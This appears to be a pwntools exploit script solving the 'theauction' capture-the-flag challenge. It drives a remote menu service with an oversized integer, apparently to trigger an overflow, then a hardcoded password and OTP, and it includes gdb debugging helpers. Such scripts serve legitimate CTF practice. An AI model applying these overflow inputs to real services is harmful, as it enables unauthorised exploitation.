from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './theauction'
HOST = 'ctf.pragyan.org'
PORT = 16000

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    # debug(r, [0x13e9, 0x141b, 0x165d, 0x1662])
    debug(r, [0x165d, 0x168b])

r.sendlineafter('choice: ', '2')
r.sendlineafter('choice: ', '1')
r.sendlineafter('flags: ', '18446744073709000')

r.sendlineafter('choice: ', '2')
r.sendlineafter('choice: ', '2')
r.sendlineafter('purchase: ', '1')
r.sendlineafter('password: ', 'iambroke')

r.sendlineafter('Enter OTP: ', '478849720716794761451385564063106643738459224')

r.interactive()
r.close()
